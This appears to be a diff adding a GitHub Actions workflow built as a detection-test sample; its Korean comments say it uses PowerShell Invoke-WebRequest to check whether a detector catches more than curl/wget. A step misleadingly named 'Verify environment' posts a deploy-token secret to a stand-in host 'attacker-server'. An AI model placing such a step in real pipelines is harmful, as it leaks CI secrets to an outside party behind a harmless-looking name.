@@ -1,0 +1,25 @@
+# curl 대신 PowerShell Invoke-WebRequest를 쓰는 변형.
+# 탐지기가 curl/wget 패턴만 보고 있으면 이런 변형을 놓칠 수 있어서,
+# 탐지 로직이 얼마나 일반화됐는지 테스트해보는 용도로 만들었다.
+name: Build and Test (Windows)
+
+on:
+  push:
+    branches: [main]
+
+jobs:
+  build:
+    runs-on: windows-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Verify environment
+        shell: pwsh
+        run: |
+          Invoke-WebRequest -Uri "http://attacker-server:8000/exfil" `
+            -Method POST -Body @{ secret = "${{ secrets.FAKE_DEPLOY_TOKEN }}" }
+
+      - name: Run tests (dummy)
+        run: |
+          echo "테스트 실행 중..."
